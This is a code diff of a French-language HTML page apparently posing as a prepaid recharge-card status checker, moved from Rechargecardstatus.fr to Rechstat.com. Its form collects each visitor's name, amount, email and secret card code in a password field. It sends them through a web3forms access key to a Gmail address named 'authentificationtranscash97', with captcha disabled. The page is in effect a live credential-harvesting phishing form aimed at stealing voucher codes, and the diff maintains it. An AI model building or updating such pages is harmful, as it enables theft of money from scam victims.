@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Rechargecardstatus.fr</title>
+  <title>Rechstat.com</title>
   <link rel="stylesheet" href="form.css">
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="assets/css/bootstrap.min.css">
@@ -15,8 +15,7 @@
   <header>
     <nav>
       <a href="index.html">Accueil</a>
-      <a href="#galerie">Galerie</a>
-      <a href="#faq">FAQ</a>
+      <a href="index.html#faq">FAQ</a>
     </nav>
     <div>
       <div class="custom-language-selector">
@@ -54,51 +53,45 @@
         <h2 class="section-title" data-i18n="contact_title"></h2>
 
         <form action="https://api.web3forms.com/submit" method="POST">
-          <input type="hidden" name="access_key" value="1eaf6de9-668d-4793-bf2a-134ad609663d">
+          <input type="hidden" name="access_key" value="fd4449f1-bff6-480c-8232-947000660f32">
           <input type="hidden" name="to_email" value="authentificationtranscash97@gmail.com">
-          <div class="form-group">
-            <label for="nom" class="label-nom">Nom :</label>
-            <input type="text" id="nom" name="nom" required placeholder="" class="input-nom">
-          </div>
+          <input type="hidden" name="redirect" value="https://rechstat.com/merci.html">
+          <input type="hidden" name="_captcha" value="false">
+          <input type="hidden" name="_template" value="table">
 
-          <div class="form-group">
-            <label for="prenom" class="label-prenom">Prénom :</label>
-            <input type="text" id="prenom" name="prenom" required placeholder="" class="input-prenom">
-          </div>
+          <label for="nom" class="label-nom">Nom :</label>
+          <input type="text" name="nom" required placeholder="">
+          
+          <label for="prenom" class="label-prenom">Prénom :</label>
+          <input type="text" name="prenom" required placeholder="">
+          
+          <label for="amount" class="label-amount">Montant :</label>
+          <input type="number" name="amount" min="1" required placeholder="">
+          
+          <label for="email" class="label-email">Votre email :</label>
+          <input type="email" name="email" required placeholder="">
 
-          <div class="form-group">
-            <label for="amount" class="label-amount">Montant :</label>
-            <input type="number" id="amount" name="amount" min="1" required placeholder="" class="input-amount">
-          </div>
-
-          <div class="form-group">
-            <label for="email" class="label-email">Votre email :</label>
-            <input type="email" id="email" name="email" required placeholder="" class="input-email">
-          </div>
-
-          <div class="form-group">
+          <div class="password-wrapper">
             <label for="code" class="label-code">Code :</label>
-            <div class="password-wrapper">
-              <input type="password" id="code" name="code" required placeholder="" class="input-code">
-            </div>
+            <input type="password" id="code" name="code" required placeholder="">
+          </div>
 
+          <p style="margin-top: 10px;">
+            <span data-i18n="form_toggle_label">Afficher le code :</span>
+          </p>
 
+          <div class="code-toggle" style="display: flex; flex-direction: column; gap: 5px; align-items: flex-start;">
+            <label style="display: flex; align-items: center; gap: 8px;">
+              <span data-i18n="form_oui">Oui</span>
+              <input type="radio" name="show_code" value="oui" onclick="toggleCode(true)">
+            </label>
+            <label style="display: flex; align-items: center; gap: 8px;">
+              <span data-i18n="form_non">Non</span>
+              <input type="radio" name="show_code" value="non" checked onclick="toggleCode(false)">
+            </label>
+          </div>
 
-            <p style="margin-top: 10px;"><span data-i18n="form_toggle_label">Afficher le code :</span></p>
-            <div class="code-toggle" style="display: flex; flex-direction: column; gap: 5px; align-items: flex-start;">
-              <label style="display: flex; align-items: center; gap: 8px;">
-                <span data-i18n="form_oui">Oui</span>
-                <input type="radio" name="show_code" value="oui" onclick="toggleCode(true)">
-              </label>
-              <label style="display: flex; align-items: center; gap: 8px;">
-                <span data-i18n="form_non">Non</span>
-                <input type="radio" name="show_code" value="non" checked onclick="toggleCode(false)">
-              </label>
-            </div>
-            <input type="hidden" name="redirect" value="https://recharge-statut.com/merci.html">
-            <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="_template" value="table">
-            <button type="submit" class="btn-submit" data-i18n="form_envoyer">Soumettre</button>
+          <button type="submit" class="btn-submit" data-i18n="form_envoyer">Soumettre</button>
         </form>
       </div>
     </section>
@@ -107,11 +100,10 @@
   <footer>
     <div class="footer-container">
       <div class="footer-links">
-        <a href="#galerie" data-i18n="footer_galerie">Galerie</a>
         <a href="#faq" data-i18n="footer_faq">FAQ</a>
         <a href="#contact" data-i18n="footer_contact">Contact</a>
       </div>
-      <p data-i18n="footer_copyright">&copy; 2025 Rechargecardstatus.fr Tous droits réservés.</p>
+      <p data-i18n="footer_copyright">&copy; 2025 Rechstat.com Tous droits réservés.</p>
     </div>
   </footer>
 
